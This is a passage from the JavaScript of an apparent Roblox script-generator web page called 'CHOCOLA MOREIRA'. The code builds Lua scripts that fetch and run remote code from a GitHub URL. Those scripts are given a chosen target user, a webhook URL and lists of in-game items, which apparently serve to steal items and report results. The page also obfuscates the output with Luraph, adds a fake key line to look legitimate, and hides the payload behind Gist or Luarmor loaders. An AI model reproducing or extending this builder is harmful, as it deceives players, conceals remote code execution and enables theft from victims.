                    script += `task.spawn(function()\n    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()\n    if type(script) == "function" then\n        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)\n    end\nend)`;
                }
                let finalScript = script; let outputScript = finalScript; let fakeKeyLine = '';
                if (window.useFakeKey) { const fakeKey = document.getElementById('fakeKeyInput').value.trim(); if (fakeKey.length > 0) { fakeKeyLine = `script_key = "${fakeKey}"\n`; } }
                if (window.obfuscateMode) {
                    showToast(t.toastObfuscating, 'warning');
                    try {
                        const obfuscated = await obfuscateWithLuraph(script);
                        if (obfuscated) { finalScript = obfuscated; showToast(t.toastObfuscated, 'success'); }
                        else { showToast(t.toastObfuscateFail, 'warning'); }
                    } catch (error) { console.error('Error ofuscando:', error); showToast(t.toastObfuscateFail, 'warning'); }
                }
                if (window.useGist) {
                    const scriptName = document.getElementById('scriptNameInput').value.trim();
                    showToast(t.toastUploading.replace('{0}', 'Gist'), 'warning');
                    try {
                        const response = await fetch(GIST_UPLOAD_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: finalScript, filename: scriptName }) });
                        const data = await response.json();
                        if (data.success && data.url) { showToast(t.toastUploadSuccess.replace('{0}', 'Gist').replace('{1}', data.filename || scriptName), 'success'); outputScript = `${fakeKeyLine}loadstring(game:HttpGet("${data.url}"))()`; }
                        else { showToast(t.toastUploadFail.replace('{0}', 'Gist').replace('{1}', data.error || 'Error desconocido'), 'error'); outputScript = `${fakeKeyLine}${finalScript}`; }
                    } catch (error) { showToast(t.toastUploadFail.replace('{0}', 'Gist').replace('{1}', error.message || 'Error de conexión'), 'error'); outputScript = `${fakeKeyLine}${finalScript}`; }
                } else if (window.useLuarmor) {
                    showToast(t.toastUploading.replace('{0}', 'Luarmor'), 'warning');
                    try {
                        const response = await fetch(LUARMOR_UPLOAD_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code: finalScript, title: 'CHOCOLA MOREIRA' }) });
                        const data = await response.json();
                        if (data.success && data.loader) { showToast(t.toastUploadSuccess.replace('{0}', 'Luarmor').replace('{1}', 'Script'), 'success'); outputScript = `${fakeKeyLine}${data.loader}`; }
                        else { showToast(t.toastUploadFail.replace('{0}', 'Luarmor').replace('{1}', data.error || 'Error desconocido'), 'error'); outputScript = `${fakeKeyLine}${finalScript}`; }
                    } catch (error) { showToast(t.toastUploadFail.replace('{0}', 'Luarmor').replace('{1}', error.message || 'Error de conexión'), 'error'); outputScript = `${fakeKeyLine}${finalScript}`; }
                } else { outputScript = `${fakeKeyLine}${finalScript}`; }
                document.getElementById('scriptOutput').textContent = outputScript;
                document.getElementById('result').classList.add('show');
                showToast(t.toastGenerated, 'success');
            } catch (error) { console.error('❌ Error generando script:', error); showToast('❌ Error generando script', 'error'); }
            finally { document.getElementById('generateBtn').innerHTML = originalButtonText; updateButtonState(); }
        }

        document.getElementById('copyBtn').onclick = () => {
            const text = document.getElementById('scriptOutput').textContent;
            navigator.clipboard.writeText(text).then(() => { showToast(translations[currentLang].toastCopied, 'success'); })
            .catch(() => { const textarea = document.createElement('textarea'); textarea.value = text; document.body.appendChild(textarea); textarea.select(); document.execCommand('copy'); textarea.remove(); showToast(translations[currentLang].toastCopied, 'success'); });
        };

        document.querySelectorAll('.language-selector button').forEach(btn => {
            btn.onclick = () => { const lang = btn.dataset.lang; if (lang !== currentLang) { applyLanguage(lang); updateNameHint(); updateButtonState(); } };
        });

        setupTargetSelector('brainrot'); setupTargetSelector('baseskin'); setupTargetSelector('gear');
        const savedLang = localStorage.getItem('chocola_lang') || 'es'; applyLanguage(savedLang);
        const savedSelections = loadSelections();
        if (savedSelections) {
            if (savedSelections.selectedTargets && Array.isArray(savedSelections.selectedTargets)) { window.selectedTargets = new Set(savedSelections.selectedTargets); }
            if (savedSelections.currentTargetId && savedSelections.currentTargetName) {
                window.currentTargetId = savedSelections.currentTargetId; window.currentTargetName = savedSelections.currentTargetName;
                document.getElementById('usernameInput').value = savedSelections.currentTargetName;
                document.getElementById('selectedName').innerText = savedSelections.currentTargetName;
                document.getElementById('selectedId').innerText = `ID: ${savedSelections.currentTargetId}`;
                document.getElementById('selectedUser').classList.add('show');
            }
            if (savedSelections.scriptType) {
                window.scriptType = savedSelections.scriptType; window.scriptMode = savedSelections.scriptMode || 'NO-GUI';
                modeCards.forEach(card => { card.classList.remove('active'); if (card.dataset.script === savedSelections.scriptType) card.classList.add('active'); });
                if (window.scriptMode === 'CUSTOM') document.getElementById('customArea').style.display = 'block';
                else document.getElementById('customArea').style.display = 'none';
            }
        }
        renderAllTargets(); renderAllChips(); updateButtonState();
        document.getElementById('generateBtn').onclick = generateScript;
        console.log('✅ CHOCOLA MOREIRA - Inicializado correctamente!');
        console.log('🛡️ Obfuscador usando Luraph v15.1');
    </script>
</body>
</html>
